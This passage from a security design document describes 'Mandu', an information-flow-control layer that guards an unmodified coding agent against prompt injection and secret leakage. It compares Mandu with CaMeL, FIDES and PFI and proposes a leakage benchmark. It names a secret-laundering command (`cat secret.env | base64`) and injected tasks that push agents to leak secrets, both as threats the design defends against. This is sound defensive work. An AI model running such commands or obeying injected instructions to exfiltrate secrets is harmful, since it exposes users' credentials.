  | `CONF-tainted-bound-blocked` (E41) | §9 rule 1(b) at the session level: the same high session bound to the same host flips from released to denied on the taint alone. |

  Refusal scenarios carry vacuity guards (the refusal is only proven on a
  call that happened). Per-symbol bound RELEASE and rung-1 routing stay at
  the deterministic seam (the net-proxy forward-proxy e2e "a symbol allowed
  to a trusted dest → the dest received the RESOLVED value", plus the
  oracle's bound-clear), because a live model will not reliably route an
  opaque `$MDU:` token into a URL and forcing it would be theater. The
  fingerprint tripwire has unit tests (`egress-fingerprint.test.ts`), a
  net-proxy e2e (`fingerprint-tripwire.test.ts`) and a seam test in the
  oracle.
- **Leakage benchmark (open).** AgentDojo's exfiltration tasks cover part of
  this; a purpose-built **agent secret-leakage suite** (plant labeled
  secrets at each level; run benign + injected tasks; measure leak rate ×
  task utility per level and per rung, rung 3 measured for *onward* leakage
  incl. paraphrase to third parties) does not exist in the literature. It
  is the evaluation this design still owes, and it should be published.

## 13. Related work, contributions, and extensibility

### 13.1 The family we belong to

The *primitives* here (opaque handles standing in for data the privileged
model must not read, a quarantined model for processing that data, taint
labels propagated along flows) are shared across a family of 2025-era IPI
defenses. The session high-watermark is the classic Bell-LaPadula
floating-label discipline (Weissman's high-watermark, Fenton's data-mark
machine) applied to a model conversation as the subject, and the
two-lattice composition is Lipner's classic integrity+confidentiality
combination. The contribution is not "taint tracking for agents"; it is
*where* the tracking is enforced, *who* counts as a sink, and *which flows*
it can see (§13.3).

### 13.2 The four closest systems

| | CaMeL (Google DeepMind) | FIDES (Microsoft) | PFI (SNU) | DualView reference (adfi-openclaw) | Mandu (this doc) |
|---|---|---|---|---|---|
| Agent cooperation | purpose-built plan-then-execute runtime (P-LLM writes a DSL plan) | purpose-built planner, typed labeled variables | modified/wrapped agent framework | OpenClaw plugin hook (one cooperative chokepoint) | **none**: unmodified Claude Code via base-URL reverse proxy + OS interceptors |
| Enforcement locus | custom interpreter over the plan | planner runtime | framework layer | model-boundary hook | four OS chokepoints (model API, net, FS, exec) |
| Integrity | ✅ strong: control flow fixed before untrusted data exists | ✅ planner never sees hidden values | ✅ privilege-escalation framing, placeholders | ✅ symbols | ✅ symbols (frozen axis) |
| Confidentiality | ✅ fine-grained per-value readers/capability sets | ✅ labels + declassification primitives | ❌ | ❌ | ✅ four levels, per-file, total order |
| Provider excluded from secrets | ❌ (Q-LLM reads raw data) | ❌ (parsing models read content) | ❌ | ❌ | ✅ `no-model`: no vendor model, incl. the U-LLM |
| Raw-byte flows (`cat secret \| base64`, subprocess writes) | ❌ outside the interpreter | ❌ | ❌ | ❌ | ✅ twins (§7.2) + readers with process taint (§8, plan 10) |
| A named program may hold the raw bytes, its outputs confined | ❌ | ❌ | ❌ | ❌ | ✅ per-file readers + process taint + per-app declassification (plan 10) |

The flow mechanism of plan 10 is placed against the sandbox, masking,
placeholder-and-inject and OS-DIFC families (Claude Code's
`credentials.files` mask, Sandlock, Flume, Purview) in
[`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)
§10; that table complements this one.

- **CaMeL** ("Defeating Prompt Injections by Design"): the strongest
  integrity story in the family (the privileged model commits to control
  flow before any untrusted data exists, so injection cannot add actions),
  and its confidentiality is *finer-grained than ours*: per-value
  readers/capability sets can express "Bob may see this document," which
  the 2×4 label collapses to which models may read it, the outside world,
  and per-datum bindings. Against that: it is a different agent, not a
  defense for existing ones (every task is rewritten as plan-then-execute,
  with documented utility loss on dynamic tasks); everything outside its
  interpreter (arbitrary exec, filesystem side effects) is unmediated or
  forbidden; and the Q-LLM reads raw data, so the provider sees everything
  and no residency claim is possible.
- **FIDES** ("Securing AI Agents with Information-Flow Control"): the
  closest conceptual neighbor to the 2×4: both lattices argued explicitly,
  label propagation with principled declassification, "hidden values" that
  are essentially our symbols with more formalization than we have.
  Against that: cooperative purpose-built runtime; labels derive from typed
  tool signatures (sound inside its world, no story for an agent that
  shells out); confidentiality governs flows to *tools*, not the provider:
  the models doing the reading sit inside its TCB by assumption.
- **PFI** ("Prompt Flow Integrity to Prevent Privilege Escalation in LLM
  Agents"): the closest lineage to Mandu: placeholders for untrusted data
  handed to the privileged agent, an unprivileged agent for untrusted
  processing, and the OS-security privilege-escalation framing Mandu
  inherits. Against that: integrity only; framework-level cooperation; no
  cross-process derived-data story.
- **The DualView reference implementation** (adfi-openclaw): the evaluated
  realization of symbolize-at-ingress / desymbolize-at-egress with the
  dual-view insight (humans see originals) and the U-LLM quarantine, with
  two gaps, one cooperative chokepoint and integrity-only, which Mandu and
  this document respectively close.

Neighboring products split by level: `no-model`'s neighbors are the LLM
PII-redaction proxies (Skyflow-style vaults): pattern-*detection* based,
fail-open on novel shapes, irreversibly redacting; `any-model`'s neighbors
are Purview-style DLP session controls, detection again. Mandu is
provenance-based, fail-closed, and reversible at bound sinks.

### 13.3 Contributions — in the order we would defend them

1. **Enforcement locus: IFC on an uncooperative agent.** Every prior
   system in the table is a different agent or a modified framework.
   Mandu enforces the same lattice properties on unmodified Claude Code
   (base-URL reverse proxy + OS chokepoints), and the guarantee survives
   what runtime systems cannot see: a subprocess is a first-class
   principal here, invisible to the prior designs.
2. **The provider as a labeled sink.** In CaMeL, FIDES, and PFI, *some*
   vendor model reads every datum (the quarantined/parsing model).
   `no-model` is, to our knowledge, the first per-datum, zero-config
   **data-residency-by-construction** claim ("your key never reaches any
   vendor model") made *while still using vendor models*. The
   `any-model`/`no-model` split turns the provider-trust question, which
   prior work buries in the TCB assumption, into a labeling decision with
   a total order and a fail-closed default.
3. **The quarantine as a confidentiality scope-minimizer** (§3.3 rung 2).
   Prior work uses the quarantined model only as an integrity isolator.
   Reusing it so `any-model` secrets are processed without watermarking
   the privileged session, confining exposure to one call whose only
   egress is a labeled symbol, is a new composition of an old mechanism.
4. **Cross-process derived-data labeling + the structural valve.** The
   laundering channel (`cat secret.env | base64`, a script copying a key)
   defeats every runtime-level system in the table; the twin (§7.2), the
   net-XOR-secrets-XOR-untrusted-lineage valve (§7.1) and process-level
   taint (§8) are a process-level answer none of them can express. Plan 10
   lifts this to per-process DIFC with declassification: a named reader
   holds the bytes, its label follows every exit, and a per-app rule says
   what the model may see of its output
   ([`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)
   §10 lists its contributions).
5. **The composition analysis and the benchmark.** The eight-cell analysis
   (§9), including the claim that `untrusted × no-model` is *synergistic*
   (each lattice covers the other's failure) and the danger-cell
   suspension rule, plus the per-level leakage benchmark (§12), which does
   not exist in the literature.

### 13.4 What we do not claim

The taint/opaque-handle machinery itself is not novel; cite all four
systems. The high-watermark is textbook; our contribution is only its role
as the enforceable meaning of `any-model` after an in-context read. Our
confidentiality policy is deliberately *coarser* than CaMeL's
readers-capabilities: auditable-and-fail-closed versus expressive, never
strictly better. Our labels come from file provenance and user labeling,
which fails silent on mislabeling (§6), whereas CaMeL/FIDES derive labels
from structure and cannot mislabel within their world. FIDES has more
formalization than we do; rung 3 is whole-session-coarse where FIDES tracks
per-variable. And our utility cost is unmeasured while CaMeL published
theirs; the benchmark (§12) has to close that.

The reader-set generalization of the label, and exactly what it takes from
FIDES and what stays ours, is in
[`confidentiality-plan-13-reader-set-labels.md`](./confidentiality-plan-13-reader-set-labels.md)
§5.

### 13.5 Extensibility hook

The first three levels were the points of a general clearance relation that
matter for one agent and one provider. If a deployment needs more
(compartments per business unit, several distinct remote clearances such as
a ZDR endpoint beside a plain one, cleared third-party sinks beyond
per-datum bindings), the confidentiality axis extends by value (the schema
already stores strings, §2) and the release rules generalize back toward a
clearance relation.

The first use of the hook is the `local-model` level
([`model-endpoints.md`](./model-endpoints.md) Part 1, §3.5): one added point on the total order,
`local-model`, for the deployment that runs a local model beside an
external one, with the endpoint's location declared in `policy.yaml` and
everything undeclared external. The axis stays a total order of four
levels, so fail-closed stays unambiguous and the watermark stays a `max`.

The second, built, is `model-endpoints.md` Part 2: `local` is redefined as inside the trust boundary rather than
on this computer, so a model on the organization's network is a `local: true`
endpoint under transport rules (TLS in both roles, per-endpoint identity,
an optional `perimeter:`) and an optional admin-owned `models:` layer. Its
§2.2 D7 writes down the several-tier shape this hook anticipates, with the
trigger for building it.
